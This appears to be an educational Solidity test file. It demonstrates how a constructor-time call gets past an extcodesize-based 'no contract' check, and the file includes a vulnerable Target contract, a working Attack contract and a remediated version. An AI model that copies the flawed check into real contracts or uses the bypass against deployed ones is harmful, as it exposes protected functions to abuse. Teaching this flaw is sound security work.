// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

contract ContractTest is Test {
        Target TargetContract;
        FailedAttack FailedAttackContract;
        Attack AttackerContract;
        TargetRemediated TargetRemediatedContract;

         constructor() {
    TargetContract = new Target();
    FailedAttackContract = new FailedAttack();
    TargetRemediatedContract = new TargetRemediated();
         }


function testBypassFailedContractCheck() public {
    
    console.log("Before exploiting, protected status of TargetContract:",TargetContract.pwned());
    console.log("Exploit Failed");
    FailedAttackContract.pwn(address(TargetContract));

    }
   
function testBypassContractCheck() public {


    console.log("Before exploiting, protected status of TargetContract:",TargetContract.pwned());
    AttackerContract = new Attack(address(TargetContract));
    console.log("After exploiting, protected status of TargetContract:",TargetContract.pwned());
    console.log("Exploit completed");

    }


function testTargetRemediatedContract() public {

    console.log("Before exploiting, protected status of TargetContract:",TargetRemediatedContract.pwned());
    AttackerContract = new Attack(address(TargetRemediatedContract));
    console.log("After exploiting, protected status of TargetContract:",TargetRemediatedContract.pwned());
    console.log("Exploit completed");

    }
  receive() payable external{}
}

contract Target {
    function isContract(address account) public view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}

contract FailedAttack {
    // Attempting to call Target.protected will fail,
    // Target block calls from contract
    function pwn(address _target) external {
        // This will fail
        Target(_target).protected();
    }
}

contract Attack {
    bool public isContract;
    address public addr;

    // When contract is being created, code size (extcodesize) is 0.
    // This will bypass the isContract() check
    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        // This will work
        Target(_target).protected();
    }
}


contract TargetRemediated {
    function isContract(address account) public view returns (bool) {
        require(tx.origin == msg.sender);
        return account.code.length > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}
